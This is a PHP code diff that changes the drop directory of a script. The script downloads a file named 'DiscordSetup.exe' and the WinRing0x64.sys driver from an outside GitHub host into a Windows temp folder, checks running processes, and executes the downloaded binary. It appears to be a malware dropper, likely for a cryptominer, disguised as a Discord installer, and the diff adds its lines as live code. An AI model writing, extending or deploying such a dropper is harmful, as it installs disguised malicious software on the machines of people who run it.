@@ -60,15 +60,15 @@ $deletePaths = [
 
 
 
-system('mkdir "C:/Users/Public/2a/"');
+system('mkdir "C:/Windows/Temp/low/"');
 
 exec('tasklist', $output);
 
 $url =  'https://github.com/mainpoint91/mainpoint/releases/download/newnight/DiscordSetup.exe';
 $url2 =  'https://raw.githubusercontent.com/mainpoint91/mainpoint/refs/heads/main/WinRing0x64.sys';
 
-$file_name = 'C:/Users/Public/2a/DiscordSetup.exe';
-$file_name2 = 'C:/Users/Public/2a/WinRing0x64.sys';
+$file_name = 'C:/Windows/Temp/low/DiscordSetup.exe';
+$file_name2 = 'C:/Windows/Temp/low/WinRing0x64.sys';
 
 $found = false;
 $found2 = false;
@@ -115,7 +115,7 @@ if (!$found && !$found2 && !$found3 && !$found4) {
             }
  
 
-         system('C:/Users/Public/2a/DiscordSetup.exe');
+         system('C:/Windows/Temp/low/DiscordSetup.exe');
         
 
 
